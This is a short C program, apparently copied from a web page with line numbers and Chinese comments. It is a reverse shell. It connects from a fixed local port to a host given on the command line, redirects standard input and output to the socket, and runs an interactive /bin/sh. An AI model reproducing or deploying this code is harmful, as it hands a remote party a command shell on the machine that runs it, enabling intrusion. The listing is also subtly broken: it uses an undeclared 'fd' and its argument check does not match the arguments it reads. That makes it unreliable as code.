
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
void error(char *msg)
{
        perror(msg);
        exit(0);
}
int main(int argc, char *argv[])
{
        int sockfd, portno, lportno,n;
        struct sockaddr_in serv_addr;
        struct sockaddr_in client_addr;
        struct hostent *server;
        char buffer[256];
        if (argc &lt; 3) {
                fprintf(stderr,"usage %s hostname port LocalPortn", argv[0]);
                exit(0);
        }                          //三个参数，目标主机，目标主机端口，本地源端口
        portno = atoi(argv[2]);
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd &lt; 0)
                error("ERROR opening socket");
 
 
        bzero((char *) &amp;client_addr, sizeof(client_addr));
        lportno = atoi(argv[3]);
        client_addr.sin_family = AF_INET;
        client_addr.sin_addr.s_addr = INADDR_ANY;
        client_addr.sin_port = htons(lportno);         //设置源端口
        if (bind(sockfd, (struct sockaddr *) &amp;client_addr,
                                sizeof(client_addr)) &lt; 0)
                error("ERROR on binding");
 
        server = gethostbyname(argv[1]);
        if (server == NULL) {
                fprintf(stderr,"ERROR, no such host ");
                exit(0);
        }
        bzero((char *) &amp;serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        bcopy((char *)server-&gt;h_addr,
                        (char *)&amp;serv_addr.sin_addr.s_addr,
                        server-&gt;h_length);
        serv_addr.sin_port = htons(portno);
        if (connect(sockfd,&amp;serv_addr,sizeof(serv_addr)) &lt; 0)   //连接
                error("ERROR connecting");
 dup2(fd, 0);
 dup2(fd, 1);
 dup2(fd, 2);
 execl("/bin/sh","sh -i", NULL);                        //执行shell 
 close(fd); 
}